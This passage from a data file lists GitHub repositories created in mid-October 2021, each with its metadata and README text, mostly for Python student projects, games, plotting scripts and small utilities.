help on setting up Pip, NumPy, and SciPy on Macs, check out this excellent guide.  Minimal Example The following illustrates how to create an instance of CausalModel: >>> from causalinference import CausalModel >>> from causalinference.utils import random_data >>> Y, D, X = random_data() >>> causal = CausalModel(Y, D, X)  Invoking help on causal at this point should return a comprehensive listing of all the causal analysis tools available in Causalinference. 
417580959;Jinja_Dynamic_HTML;https://github.com/Kamil-Ru/Jinja_Dynamic_HTML;;2021-10-15T17:21:23Z;0;0;0;
417571335;Tensorflow-DNN;https://github.com/SYeameen/Tensorflow-DNN;Jupyter Notebook;2021-10-15T16:45:40Z;0;0;0;Tensorflow-DNN 
417566399;rock-and-paper-and-scissors;https://github.com/jasser2001/rock-and-paper-and-scissors;Python;2021-10-15T16:27:23Z;0;0;0;rock-and-paper-and-scissors game in python 
417651222;run;https://github.com/viniciuscgp/run;Python;2021-10-15T22:16:17Z;1;1;0;Run Zé,  run !!!! Jogo para aprender Python Plot Zé amanheceu achando que aliens invadiram a terra. Zé ficou doidão e ta atirando em tudo que vê. Cuidado com o Zé! Para executar -Você deve ter o Python instalado. -Você deve ter a lib pygame instalada. python run.py Controles   Z para Pular   X para Atirar   ESC pára fugir para a tranquilidade do shell   Prentendo gerar um executável assim que terminar o jogo. Abraço. 
417565440;TelTEst;https://github.com/nanocodes64/TelTEst;;2021-10-15T16:23:48Z;0;0;0;
417654328;dice-image-creator;https://github.com/alihoushyaripour/dice-image-creator;Python;2021-10-15T22:32:25Z;0;0;0;Dice Image A simple collection of python scripts to generate and animate a picture made of dice. Dependencies:  pygame (for animation) OpenCV 3 (for saving and generating the new image) numpy  Example Original picture:  Result:  
417600643;Getting-Ready-for-Physics-Class;https://github.com/Boateng24/Getting-Ready-for-Physics-Class;Python;2021-10-15T18:37:19Z;0;0;0;Getting-Ready-for-Physics-Class Codecademy python functions project 
417584295;DAS_v2;https://github.com/gitkseniya/DAS_v2;Python;2021-10-15T17:34:09Z;0;0;0;
417635084;disappearingTextApp;https://github.com/Tabinka/disappearingTextApp;Python;2021-10-15T21:02:27Z;0;0;0;
417566629;RockPaperScissorsLizardSpock;https://github.com/joeylking/RockPaperScissorsLizardSpock;Python;2021-10-15T16:28:10Z;1;1;0;
417610641;Bright_Ideas;https://github.com/SiripaMineo/Bright_Ideas;;2021-10-15T19:17:59Z;0;0;1;
417587032;pyHub;https://github.com/thiagoaquinodasilva/pyHub;;2021-10-15T17:44:38Z;0;0;0;pyHub Repositório de projetos Python 
417595518;MIPT_Labs;https://github.com/Sageblatt/MIPT_Labs;Python;2021-10-15T18:17:12Z;0;0;0;MIPT_Labs 
417581307;surfs_up;https://github.com/ckeistler/surfs_up;Jupyter Notebook;2021-10-15T17:22:42Z;0;0;0;surfs_up Python, Flask, SQL 
417584170;jokenpopy;https://github.com/luccgatto/jokenpopy;Python;2021-10-15T17:33:38Z;0;0;0;
417617318;flash-card;https://github.com/fyupanquia/flash-card;Python;2021-10-15T19:47:22Z;0;0;0;
417622961;Encrypt-py-kivymd;https://github.com/muntazir-halim/Encrypt-py-kivymd;Python;2021-10-15T20:12:02Z;1;1;1;Encrypt-py-kivymd Python file encryption app to install kivy==1.11.1  kivymd==0.104.1  kivymd_extensions  kivymd_extensions.akivymd  
417615696;Interactive_python_learning_website_with_compiler;https://github.com/Teja-P-oss/Interactive_python_learning_website_with_compiler;HTML;2021-10-15T19:39:54Z;1;1;0;Interactive_python_learning_website_with_compiler This is a python tutorial website that has tutorial in it and has an interactive python compiler inside the webpage  
417641715;python-list-comprehension-mHLrDy;https://github.com/tryspidy/python-list-comprehension-mHLrDy;Python;2021-10-15T21:29:50Z;0;0;0;
417631583;Human-generator-using-Flutter-and-python;https://github.com/Yosi2020/Human-generator-using-Flutter-and-python;Dart;2021-10-15T20:49:00Z;1;1;0;humangenerator A new Flutter project with Python data you can get the python human generating code from https://drive.google.com/file/d/1aXNPgm6w3qbSsjBfsLGK_hCbhRUyiUJc/view?usp=sharing. Do some people say what is going on here? the answer is simple by taking the human face and drawing face data together for the training model. Then, we connect the model into our human generator app finally, when you draw the human face then our model will predict what the person looks like. for this project, the best example is to predict the suspected person. Getting Started This project is a starting point for a Flutter application. A few resources to get you started if this is your first Flutter project:  Lab: Write your first Flutter app Cookbook: Useful Flutter samples  For help getting started with Flutter, view our online documentation, which offers tutorials, samples, guidance on mobile development, and a full API reference. I amn't good on drawing sorry for bad ouput but the output look like  any one who want the final model he/she can contact me using using my email eyosimar524@gmail.com and on my telegram account using @LindaAug1 
417649804;ICS3U-Assignment-6-Python-Parallel;https://github.com/lily-liu-17/ICS3U-Assignment-6-Python-Parallel;Python;2021-10-15T22:09:11Z;0;0;0;ICS3U-Assignment-5-Python-Parallel  
417569117;ICS3U-Unit5-04-Python;https://github.com/Joshua-Yeung-2/ICS3U-Unit5-04-Python;;2021-10-15T16:37:24Z;0;0;0;ICS3U-Unit5-04-Python  
417564477;ICS3U-Unit5-04-Python;https://github.com/trent-hodgins-01/ICS3U-Unit5-04-Python;Python;2021-10-15T16:20:22Z;0;0;0;ICS3U-Unit5-04-Python  
417580164;Python-Exercicios-CeV-Gustavo-Guanarabara;https://github.com/GregMasterBr/Python-Exercicios-CeV-Gustavo-Guanarabara;Python;2021-10-15T17:18:13Z;0;0;0;Python-Exercicios-CeV-Gustavo-Guanarabara Resolução de Exercícios Curso em Vídeo. Gustavo Guanabara. Curso em Vídeo Veja o curso de Python PARTE 1 em https://www.youtube.com/playlist?list=PLHz_AreHm4dlKP6QQCekuIPky1CiwmdI6  Veja o curso de Python PARTE 2 em https://www.youtube.com/playlist?list=PLHz_AreHm4dk_nZHmxxf_J0WRAqy5Czye  Veja o curso de Python PARTE 3 em https://www.youtube.com/watch?v=0LB3FSfjvao&list=PLHz_AreHm4dksnH2jVTIVNviIMBVYyFnH&t=0s  Veja a lista de exercícios de Python em https://www.youtube.com/playlist?list=PLHz_AreHm4dm6wYOIW20Nyg12TAjmMGT-  Todas as resoluções no Google Colab - https://colab.research.google.com/drive/1Kf_Cpfg5teUsk9kLNswwDzfPfwYEZ4Wm?usp=sharing 
417604565;Data-Analysis-with-Python-and-Pandas;https://github.com/daviddelsol1998/Data-Analysis-with-Python-and-Pandas;Python;2021-10-15T18:53:45Z;0;0;0;"Overview The pupupose of this repository is to showcase data analysis skills using Python and the pandas library. I will be using a pay scale data set containing salary information for different colleges majors. The main module uses methods from the pandas library to process the data set and gain insights to answers the following questions: Basic requirements: • Which degrees have the highest starting salaries?  • Which majors have the lowest earnings after college?   Stretch requirements: • What are the lowest risk college majors from an earnings standpoint?  This is based on the learning resources provided by day 71 the ""100 days of code"" Udemy course, please see link for the course under ""Useful links"". Software Demo Video Data Analysis Results • Which degrees have the highest starting salaries? Major with the highest starting salary Major name: Physician Assistant Salary: $74300.0 Major with the highest mid-career salary Major name: Chemical Engineering Salary: $107000.0  • Which majors have the lowest earnings after college? Major with the lowest starting salary Major name: Spanish Salary: $34000.0 Major with the lowest mid-career salary Major name: Education Salary: $52000.0  • What are the lowest risk college majors from an earnings standpoint? The 5 lowest risk majors are: index      Undergraduate Major  difference 40                     Nursing     50700.0 43         Physician Assistant     57600.0 41                   Nutrition     65300.0 49                     Spanish     65400.0 27  Health Care Administration     66400.0 Development Environment For the development environment, I will be using VS code as a my IDE running on Ubuntu 21.10 with GNOME 40. Git and Github are used for source control and repository management. The code will be written in python under a virtual environment for lib dependencies for Pandas. Data analysis and procedures is made possible using the pandas library. Autopep8 libary has been used for code formatting. Useful Websites  Udemy course ""100 days of code"" Pandas documentation Data set source ""Payscale""  Future Work Some other questions that I would like to answer from analysing the data set in the future are: • Which degrees have the highest earning potential? • Do business, STEM (Science, Technology, Engineering, Mathematics) or HASS (Humanities, Arts, Social Science) degrees earn more on average? "
417668713;Week_7_5_C-with_Python_code;https://github.com/bradbucher/Week_7_5_C-with_Python_code;;2021-10-15T23:58:57Z;0;0;0;"#include <Python.h> #include  #include  #define NOMINMAX #include <Windows.h> #undef NOMINMAX #include  #include  #include  using namespace std; /* Description: To call this function, simply pass the function name in Python that you wish to call. Example: callProcedure(""printsomething""); Output: Python will print on the screen: Hello from python! Return: None / void CallProcedure(string pName) { char procname = new char[pName.length() + 1]; std::strcpy(procname, pName.c_str()); Py_Initialize(); PyObject* my_module = PyImport_ImportModule(""PythonCode""); PyErr_Print(); PyObject* pValue = PyBuildValue(""(i)"", param); PyObject* my_function = PyObject_GetAttrString(my_module, procname); PyObject* my_result = PyObject_CallObject(my_function, pValue); Py_Finalize();  delete[] procname;  } /* Description: To call this function, pass the name of the Python functino you wish to call and the string parameter you want to send Example: int x = callIntFunc(""PrintMe"",""Test""); Output: Python will print on the screen: You sent me: Test Return: 100 is returned to the C++ / int callIntFunc(string proc, string param) { char procname = new char[proc.length() + 1]; std::strcpy(procname, proc.c_str()); char* paramval = new char[param.length() + 1]; std::strcpy(paramval, param.c_str());  PyObject* pName, * pModule, * pDict, * pFunc, * pValue = nullptr, * presult = nullptr; // Initialize the Python Interpreter Py_Initialize(); // Build the name object pName = PyUnicode_FromString((char*)""PythonCode""); // Load the module object pModule = PyImport_Import(pName); // pDict is a borrowed reference  pDict = PyModule_GetDict(pModule); // pFunc is also a borrowed reference  pFunc = PyDict_GetItemString(pDict, procname); if (PyCallable_Check(pFunc)) {     pValue = Py_BuildValue(""(z)"", paramval);     PyErr_Print();     presult = PyObject_CallObject(pFunc, pValue);     PyErr_Print(); } else {     PyErr_Print(); } //printf(""Result is %d\n"", _PyLong_AsInt(presult)); Py_DECREF(pValue); // Clean up Py_DECREF(pModule); Py_DECREF(pName); // Finish the Python Interpreter Py_Finalize();  // clean  delete[] procname; delete[] paramval;  return _PyLong_AsInt(presult);  } /* Description: To call this function, pass the name of the Python functino you wish to call and the string parameter you want to send Example: int x = callIntFunc(""doublevalue"",5); Return: 25 is returned to the C++ / int callIntFunc(string proc, int param) { char procname = new char[proc.length() + 1]; std::strcpy(procname, proc.c_str()); PyObject* pName, * pModule, * pDict, * pFunc, * pValue = nullptr, * presult = nullptr; // Initialize the Python Interpreter Py_Initialize(); // Build the name object pName = PyUnicode_FromString((char*)""PythonCode""); // Load the module object pModule = PyImport_Import(pName); // pDict is a borrowed reference  pDict = PyModule_GetDict(pModule); // pFunc is also a borrowed reference  pFunc = PyDict_GetItemString(pDict, procname); if (PyCallable_Check(pFunc)) {     pValue = Py_BuildValue(""(i)"", param);     PyErr_Print();     presult = PyObject_CallObject(pFunc, pValue);     PyErr_Print(); } else {     PyErr_Print(); } //printf(""Result is %d\n"", _PyLong_AsInt(presult)); Py_DECREF(pValue); // Clean up Py_DECREF(pModule); Py_DECREF(pName); // Finish the Python Interpreter Py_Finalize();  // clean  delete[] procname;  return _PyLong_AsInt(presult);  } /* Description: When this function is called, it will produce a menu to prompt user input. Example: DrawMenu(); Output: Outputs a menu that will take user input between 1-4. User input will then execute the appropriate Python function. That is, a user input of 1 will output a list of unique words and their number of appearances, input of 2 will search for the number of a single item's appearances, an input of 3 will print a histogram of each item's appearances, and an input of 4 will quit the program. Return: None */ void DrawMenu() { //Initialize method-specific variables int menuLoop = 0;                                                       //Track the number of menu loops int wordCount = 0;                                                      //Track the number of times a specific searched word was found int itemQuantity = 0;                                           //Variable to contain an item quantity from frequency.dat string searchTerm;                                                      //Collect user input for a search term string itemName;                                                        //Variable to contain an item name from frequency.dat string greenColor = ""\033[32;1m"";                       //Set font color green for the histogram asterisks string defaultColor = ""\033[0m"";                        //Set default font color for the console ifstream fileInput;                                                     //Open ifstream for file  while (menuLoop != 4) {      //Prompt and collect user input     std::cout << ""[1] Calculate the number of times each item appears"" << std::endl;     std::cout << ""[2] Calculate the frequency of a specific item"" << std::endl;     std::cout << ""[3] Create a histogram based on the number of appearances of each item"" << std::endl;     std::cout << ""[4] Quit"" << std::endl;     std::cin >> menuLoop;      //Check if user input is valid. If not, prompt correct input.     while (std::cin.fail()) {         std::cin.clear();         std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');         std::cout << ""Please input a valid selection: "";         std::cin >> menuLoop;     }      //Switch statement: Execute the proper command for user input     switch (menuLoop) {          //         //Case 1: Calculate the number of times each item appears, then print a list         //     case 1:         system(""CLS"");                                          //Clear the screen to tidy things up         CallProcedure(""CountAll"");                      //Call the Python function ""CountAll""         std::cout << std::endl;                           //Add a bit of space in between the printed list and menu         break;          //         //Case 2: Calculate the number of times a specific item appears, then print the result.         //     case 2:         //Clear the screen, then collect user input for search         system(""CLS"");         std::cout << ""What item would you like to search for?"" << std::endl;         std::cin >> searchTerm;          //Call Python function with the search term, then return an integer word count value.         wordCount = callIntFunc(""CountInstances"", searchTerm);          //Print statement with returned word count.         std::cout << std::endl << searchTerm << "" : "" << wordCount << std::endl << std::endl;          break;          //         //Case 3: Print a histogram based on how many times each item appears. Like case 1, but with stars.         //     case 3:         system(""CLS"");                                          //Clear the screen to tidy things up         CallProcedure(""CollectData"");           //Call the Python function ""CollectData""          fileInput.open(""frequency.dat"");        //Open frequency.dat          fileInput >> itemName;                            //Collect first item on list         fileInput >> itemQuantity;                        //Collect first quantity on list          //For each line in the file, print a histogram. After every line has been parsed, break.         while (!fileInput.fail()) {             //Set text color to the default white             std::cout << defaultColor;              //Print the item name, then prepare for the histogram             std::cout << std::setw(14) << std::left << itemName << std::setw(6);              //Set histogram color (for fun)             std::cout << greenColor;              //Print itemQuantity number of asterisks             for (int i = 0; i < itemQuantity; i++) {                  //Print green asterisks in line.                 std::cout << std::right << ""*"";             }             //Prepare for the next line, then set the next item's name and quantity.             std::cout << std::endl;             fileInput >> itemName;             fileInput >> itemQuantity;         }          //Close frequency.dat, reset font color, then break         fileInput.close();         std::cout << defaultColor << endl;         break;          //         //Case 4: Quit the program.         //     case 4:         return;          //Default case: Invalid input     default:         std::cout << ""Please input a valid selection."";         std::cout << std::endl;         break;     } }  } //Main method. Calls the DrawMenu method to collect user input. int main() { //Draw the user menu. DrawMenu(); } "
417569561;Task---1-For-Advance-Python-Programmers-;https://github.com/mrcomet/Task---1-For-Advance-Python-Programmers-;;2021-10-15T16:39:12Z;0;0;0;Task---1-For-Advance-Python-Programmers- Task - 1 (For Advance Python Programmers) OF INOMATICS 
417668958;BioStar2PythonBackupToolRelease;https://github.com/gcartlidge/BioStar2PythonBackupToolRelease;;2021-10-16T00:00:34Z;0;0;0;"I thought of doing a public rep for the .exe so its easier! Running BackupRestore.exe with -h, ""BackupRestore.exe -h"" on CMD will give you the following guide to running  BioStar2 Backup & Restore -p <PortNumber> -k <KeyFile> -c <CertFile> -a <IP Address>  An example of the proper running ettiquete is below: BackupRestore.exe -p 449 -a 127.0.0.1 -k ""C:\\biostar_cert.key"" -c ""C:\\biostar_cert.crt""  The download link for the backup will only work if site is secure (Or changed chrome settings)  Install the certificate properly first!  The tool by default is setup for 64 bit usage, but the folders used for backup can be changed within the settings section  The mysqldump.exe and mysql.exe instances can also be changed but use the default ones in the BioStar2 (x64) folder.  Replace -c and -k path in running above with BioStar2 .crt and .key files from (nginx\conf).  Its still rough, but any ideas, shoot me an email at gcartlidge@supremainc.com :) "
417572167;PiPicoMicroPythonDoublePrecision;https://github.com/shabaz123/PiPicoMicroPythonDoublePrecision;;2021-10-15T16:48:49Z;0;0;0;PiPicoMicroPythonDoublePrecision Some pre-built binaries for MicroPython for the Raspberry Pi Pico. These binaries are built with double-precision math. For further details, and how to build such binaries, see here: https://www.element14.com/community/community/raspberry-pi/blog/2021/10/15/pi-pico-rp2040-micropython-double-precision 
417643387;2021-11-18-unt-online;https://github.com/unt-carpentries/2021-11-18-unt-online;HTML;2021-10-15T21:38:04Z;0;0;0;" The Carpentries Workshop Template This repository is The Carpentries' (Software Carpentry, Data Carpentry, and Library Carpentry's) template for creating websites for workshops.   Please do not fork this repository directly on GitHub. Instead, please use GitHub's ""template"" function following the instructions below to copy this workshop-template repository and customize it for your workshop.   Please do your work in your repository's gh-pages branch, since that is what is automatically published as a website by GitHub.   Once you are done, please also let us know the workshop URL. If this is a self-organised workshop, you should also fill in the self-organized workshop form (if you have not already done so), so we can keep track of all workshops. We build the list of workshops on our websites from the data included in your index.md page. We can only do that if you customize that page correctly and let us know the workshop URL.   If you run into problems, or have ideas about how to make this process simpler, please get in touch. The pages on customizing your website, the FAQ, and the design notes have more detail on what we do and why. And please note: if you are teaching Git, please create a separate repository for your learners to practice in. Video Tutorial There is a YouTube video that demonstrates how to create a workshop website. Creating a Repository   Log in to GitHub. (If you do not have an account, you can quickly create one for free.) You must be logged in for the remaining steps to work.   On this page (https://github.com/carpentries/workshop-template), click on the green ""Use this template"" button (top right)    Select the owner for your new repository. (This will probably be you, but may instead be an organization you belong to.)   Choose a name for your workshop website repository. This name should have the form YYYY-MM-DD-site, e.g., 2016-12-01-oomza, where YYYY-MM-DD is the start date of the workshop. If your workshop is held online, then the respository name should have -online in the end. e.g., 2016-12-01-oomza-online   Make sure the repository is public, leave ""Include all branches"" unchecked, and click on ""Create repository from template"". You will be redirected to your new copy of the workshop template respository.   Your new website will be rendered at https://your_username.github.io/YYYY-MM-DD-site. For example, if your username is gvwilson, the website's URL will be https://gvwilson.github.io/2016-12-01-oomza.   If you experience a problem, please get in touch. Customizing Your Website (Required Steps) There are two ways of customizing your website. You can either:  edit the files directly in GitHub using your web browser clone the repository on your computer and update the files locally  Updating the files on GitHub in your web browser   Go into your newly-created repository, which will be at https://github.com/your_username/YYYY-MM-DD-site. For example, if your username is gvwilson, the repository's URL will be https://github.com/gvwilson/2016-12-01-oomza.   Ensure you are on the gh-pages branch by clicking on the branch under the drop down in the menu bar (see the note below):    Edit the header of index.md to customize the list of instructors, workshop venue, etc. You can do this in the browser by clicking on it in the file view on GitHub and then selecting the pencil icon in the menu bar:  Editing hints are embedded in index.md, and full instructions are in the customization instructions.   Remove the notice about using the workshop template in the index.md file. You can safely delete everything between the {% comment %} and {% endcomment %} (included) as indicated below (about from line 35 to line 51): {% comment %} <------------ remove from this line 8< ============= For a workshop delete from here ============= For a workshop please delete the following block until the next dashed-line {% endcomment %}  <div class=""alert alert-danger"">   .... </div>  {% comment %}  8< ============================= until here ================== {% endcomment %} <--------- until this line    Edit _config.yml to customize certain site-wide variables, such as: carpentry (to tell your participants the lesson program for your workshop), curriculum and flavor for the curriculum  taught in your workshop, and title (overall title for all pages). Editing hints are embedded in _config.yml, and full instructions are in the customization instructions.   Edit the schedule.html file to edit the schedule for your upcoming workshop. This file is located in the _includes directory, make sure to choose the one from the appropriate dc (Data Carpentry workshop), lc (Library Carpentry), or swc (Software Carpentry) subdirectory.   Working locally  Note: you don't have to do this, if you have already updated your site using the web interface.  If you are already familiar with Git, you can clone the repository to your desktop, edit index.md, _config.yml, and schedule.html following the instruction above there, and push your changes back to the repository. git clone https://github.com/your_username/YYYY-MM-DD-site In order to view your changes once you are done editing, if you have bundler installed (see the installation instructions below), you can preview your site locally with: make serve and go to http://0.0.0.0:4000 to preview your site. Before pushing your changes to your repository, we recommend that you also check for any potential issues with your site by running: make workshop-check Once you are satisfied with the edits to your site, commit and push the changes to your repository. A few minutes later, you can go to the GitHub Pages URL for your workshop site and preview it. In the example above, this is https://gvwilson.github.io/2016-12-01-oomza. The finished page should look something like this. Optional but Recommended Steps Update your repository description and link your website At the top of your repository on GitHub you'll see No description, website, or topics provided. — Edit  Click 'Edit' and add:   A very brief description of your workshop in the ""Description"" box (e.g., ""Oomza University workshop, Dec. 2016"")   The URL for your workshop in the ""Website"" box (e.g., https://gvwilson.github.io/2016-12-01-oomza)   This will help people find your website if they come to your repository's home page. Update the content of the README file You can change the README.md file in your website's repository, which contains these instructions, so that it contains a short description of your workshop and a link to the workshop website. Additional Notes Note: please do all of your work in your repository's gh-pages branch, since GitHub automatically publishes that as a website. Note: this template includes some files and directories that most workshops do not need, but which provide a standard place to put extra content if desired. See the design notes for more information about these. Further instructions are available in the customization instructions. This FAQ includes a few extra tips (additions are always welcome) and these notes on the background and design of this template may help as well. Creating Extra Pages In rare cases, you may want to add extra pages to your workshop website. You can do this by putting either Markdown or HTML pages in the website's root directory and styling them according to the instructions give in the lesson template. Installing Software If you want to set up Jekyll so that you can preview changes on your own machine before pushing them to GitHub, you must install the software described in the lesson example setup instructions. Setting Up a Separate Repository for Learners If you are teaching Git, you should create a separate repository for learners to use in that lesson. You should not have them use the workshop website repository because:   your workshop website repository contains many files that most learners don't need to see during the lesson, and   you probably don't want to accidentally merge a damaging pull request from a novice Git user into your workshop's website while you are using it to teach.   You can call this repository whatever you like, and add whatever content you need to it. Getting and Giving Help We are committed to offering a pleasant setup experience for our learners and organizers. If you find bugs in our instructions, or would like to suggest improvements, please file an issue or mail us. "
417628202;msodos;https://github.com/crberme/msodos;Python;2021-10-15T20:37:01Z;0;0;0;MSODOS MSODOS, or MS SOftware DOwnload Scrapper, is a Python tool that scrappes captured versions of the MS software download websites to get the product edition IDs for all available ISOs. This tools feeds off Wayback Machine's data and uses its CDX Server API. Usage python msodos.py  What I've learned  Parsing HTML using Python's Standard Library Cache in python Object persistence  
417651363;Projects;https://github.com/larryyuansen/Projects;Jupyter Notebook;2021-10-15T22:16:56Z;0;0;0;Projects python work Scapy analysis             LSTM model to predict quantity of connection times               Java Work JAVA miniservices with custom TCP protocols             JAVA based on phone (Android Mobile APP) 
417575238;hello_world;https://github.com/Brigid1542/hello_world;;2021-10-15T16:59:41Z;0;0;0;hello_world 
417603785;handling-capture-open-cv;https://github.com/farhanaldyy/handling-capture-open-cv;Python;2021-10-15T18:50:25Z;0;0;0;
417572321;calculatorP;https://github.com/Vasyaph/calculatorP;Python;2021-10-15T16:49:21Z;0;0;0;
417603516;Image_Magic;https://github.com/CT102005/Image_Magic;Python;2021-10-15T18:49:12Z;0;0;0;
417626555;API-Endpoints;https://github.com/TLI-Group-1/API-Endpoints;;2021-10-15T20:29:18Z;0;0;0;API-Endpoints AutoDirect Python-based API interface. 
417613638;raspador_de_dados;https://github.com/LucasSilvaMarts/raspador_de_dados;Python;2021-10-15T19:30:58Z;0;0;0;
417641532;ur;https://github.com/jenkka/ur;Python;2021-10-15T21:28:53Z;0;0;0;
417565241;Simple-Calculator;https://github.com/amit0693/Simple-Calculator;Python;2021-10-15T16:23:04Z;0;0;0;
417610731;infinite-days-of-code;https://github.com/knikhurpa/infinite-days-of-code;;2021-10-15T19:18:25Z;0;0;0;infinite-days-of-code A collection of python scripts 
417622199;pyinspect.el;https://github.com/it-is-wednesday/pyinspect.el;Emacs Lisp;2021-10-15T20:08:41Z;0;0;0;"pyinspect.el Major mode for inspecting object in a running Python process 🥴  Setup (load-file ""/path/to/pyinspect.el"") (define-key python-mode-map (kbd ""C-c i"") #'pyinspect-inspect-at-point) Usage Eval a Python buffer in a Python process (usually C-c C-c once you’re in the buffer), then place   your cursor on a variable and hit C-c i to open the inspection buffer Default keybindings  KeyAction RETInspect field at point h / uGo back to parent inspection buffer qKill all inspection buffers and delete window  "
417654452;brownie;https://github.com/314arhaam/brownie;Python;2021-10-15T22:33:10Z;0;0;0;brownie 2D Brownian Motion in Python 
417627444;Snake-the-Game;https://github.com/LeonardoOsugi/Snake-the-Game;Python;2021-10-15T20:33:18Z;0;0;0;Snake-the-Game Meu primeiro repositório em python e sobre jogos/  My first repository on python and about games 
417588805;Plotting_WRF_NetCDF;https://github.com/ksopan/Plotting_WRF_NetCDF;Python;2021-10-15T17:51:31Z;0;0;0;"WRF Plot plotwrf.py Python script to plot various WRF-ARW output. Written for Python 2.x Currently plots  2m temp and wind barbs MSLP only Total accumulated precipitation Total precipitation Convective precipitation 2m dew point temperature Relative humidity Snow accumulation Hail accumulation Simulated reflectivity Composite reflectivity LCL Theta-e Upper level charts (geopotential height, wind barbs and temperature) H7-H5 lapse rates 500mb absolute vorticity 0-6km Shear Vertical Velocity IR Temp Skew-t Plots (Uses pyMeteo package) Skew-t Plots using SHARPpy (Currently testing stage) 2-5km Updraft Helicity (Testing)  Also supports saving plots as PNG images. Example Usage: plotwrf.py --infile filename.nc --sfc --tunit C --td --ppn --punit mm Use plotwrf.py --help to see all possible options. Future improvements  Plotting of severe weather parameters such as; CAPE, SRH, 0-6 SHR etc Plotting of soundings at a given latitude and longitude. Currently using pyMeteo package and SHARPpy. Need to plot more detailed soundings. Get data for given latitude and longitude such as max/min of variables Revise reflectivity routine. Possibly use FORTRAN routines to compute reflectivity  Known Issues  Simulated and Composite Reflectivity calculations used are for Ferrier, WSM5, fixed intercept microphysics. Plots seem to work. Need to fix vertical velocity calculation to use vertical motion omega equation (microbars/s) and not vertical velocity  Feel free to use and modify this script but please give credit when used. "
417666270;Databases-and-SQL-for-Data-Science-with-Python;https://github.com/nurulsaidi/Databases-and-SQL-for-Data-Science-with-Python;Jupyter Notebook;2021-10-15T23:44:09Z;0;0;0;
417609037;python-flask-food-blog-and-multiseller-shop-project;https://github.com/AbdullahAlmizan644/python-flask-food-blog-and-multiseller-shop-project;CSS;2021-10-15T19:11:15Z;0;0;0;python-flask-food-blog-and-multiseller-shop-project 
417589726;python_flask_agricultural_blog_shop_expertHelp_project;https://github.com/AbdullahAlmizan644/python_flask_agricultural_blog_shop_expertHelp_project;JavaScript;2021-10-15T17:55:09Z;0;0;0;python_flask_agricultural_blog_shop_expertHelp_project 
417560390;calculator-in-python-QpG2T2;https://github.com/tryspidy/calculator-in-python-QpG2T2;Python;2021-10-15T16:06:15Z;0;0;0;
417559485;ICS3U-Unit5-04-Python-Cylinder;https://github.com/liam-fletcher1/ICS3U-Unit5-04-Python-Cylinder;Python;2021-10-15T16:03:23Z;0;0;0;ICS3U-Unit5-04-Python-Cylinder  
417566023;ICS3U-Unit5-04-Python-CylinderVolume;https://github.com/dbcalitis/ICS3U-Unit5-04-Python-CylinderVolume;Python;2021-10-15T16:25:58Z;0;0;0;ICS3U-Unit5-04-Python-CylinderVolume  
417616005;Vehicle-Detection-Model-using-Python-and-OpenCV;https://github.com/AdityaPanwar77/Vehicle-Detection-Model-using-Python-and-OpenCV;Python;2021-10-15T19:41:24Z;0;0;0;
417566227;ICS3U-Unit5-02-Python-Area_Of_Triangle;https://github.com/Mikayla-Barthelette-1/ICS3U-Unit5-02-Python-Area_Of_Triangle;Python;2021-10-15T16:26:40Z;0;0;0;ICS3U-Unit5-02-Python-Area_Of_Triangle  
417581710;chapeuzinho;https://github.com/pnlpcarolina/chapeuzinho;Python;2021-10-15T17:24:17Z;0;0;0;😊 Repo para manter meu git atualizado com alguns dos meus treinos em python, espero que não se importe. Considero aqui uma forma de organizar o que já aprendi e fidelizei o conhecimento, bem como algumas aplicações que posso vir a desenvolver nos estudos e exemplos executados. O que eu já sei? [que já foi publicado]  Número inteiros, float e strings Variáveis   
417614269;warad;https://github.com/luciotorre/warad;Python;2021-10-15T19:33:32Z;0;0;0;THIS IS A TOY War, huh, yeah What is it good for? Absolutely nothing, uhh WARAD: The WAR Automatic Differentiation python library. What does it do? def f(x):      return x * 2  df = differentiate(f)  assert df(10) == 2  def g(x):     r = 0     for i in range(6):         if i % 2 == 1:             r = r + x ** i     return r          e = 0.0001 dg = differentiate(g) x = 1 assert g(x + e) == pytest.approx(g(x) + e * dg(x)) Current status  Can differentiate functions (the idea worked!) Woefully incomplete Very easy to write code that will give wrong derivatives  
417616531;hello;https://github.com/IRPhosiwa/hello;;2021-10-15T19:43:54Z;0;0;0;
417646649;GeoSon_Kingdom;https://github.com/jrson11/GeoSon_Kingdom;;2021-10-15T21:55:21Z;0;0;0;This is a manual for specific users. Code will not open to public. Contents from geoson import geoson_kingdom   XYfromAGS: converting engineering AGS data into well XY coordinates for Kingdom software TDfromAGS: generating Time-Depth chart on well locations before applying CPT data to Kingdom software CPTfromAGS: converting engineering CPT data (qc,fs,u2) in AGS file into log data for Kingdom software GeospatialGridsFromCPT: interpolating engineering CPT data to generate synthetic geologic 3D grids  Examples Case study is based on public open data from https://offshorewind.rvo.nl/soilw 01. Create New Wells  XYfromAGS  02. Define Time-Depth on Well Locations  TDfromAGS  03. Apply Log Profile on Well Locations  CPTfromAGS  
417561287;LoopKillers;https://github.com/h3ik0th/LoopKillers;Jupyter Notebook;2021-10-15T16:09:21Z;0;0;0;
417570244;hello;https://github.com/SNCL237/hello;;2021-10-15T16:41:49Z;0;0;0;
417646553;automacaoportalgov;https://github.com/Pythonic2/automacaoportalgov;;2021-10-15T21:54:46Z;0;0;0;automacaoportalgov dessenvolver automação com selenium e python 
417587364;qif-library;https://github.com/ramongonze/qif-library;Python;2021-10-15T17:45:56Z;1;1;0;libqif Python library for Quantitative Information Flow (QIF) 
417569476;Flask-Market;https://github.com/amurshak/Flask-Market;Python;2021-10-15T16:38:56Z;0;0;0;
417619413;Siddheshwar-More;https://github.com/sid9156/Siddheshwar-More;;2021-10-15T19:56:37Z;0;0;0;
417659795;pygame_classes;https://github.com/AlanRP/pygame_classes;Python;2021-10-15T23:05:54Z;0;0;0;
417577286;stores-rest-api-test;https://github.com/kodosa7/stores-rest-api-test;Python;2021-10-15T17:07:11Z;0;0;0; Stores REST Api This is built with Flask, Flask-RESTful, Flask-JWT, and Flask-SQLAlchemy. Deployed on Heroku. 
417641632;Hangman;https://github.com/JoseFernando7/Hangman;Python;2021-10-15T21:29:24Z;0;0;0;
417658717;pysync;https://github.com/paulhutchings/pysync;;2021-10-15T22:59:51Z;0;0;0;pysync Python wrapper library for rsync executable. Future goals are to either implement rsync algorithms and protocol directly in python or generate python bindings to the native rsync C code so that this becomes more of a true library instead of a CLI wrapper. Use The base class is Rsync, which represents a single rsync job/command that you would run in the terminal: from pysync import Rsync  rsync = Rsync(source, dest) rsync.run()  See API Reference for the full list of available options. API Reference 
417583796;crl;https://github.com/ojectorYT/crl;Python;2021-10-15T17:32:18Z;0;0;0;crl Cyber Reality. Python Game With SoundTracks. Source 
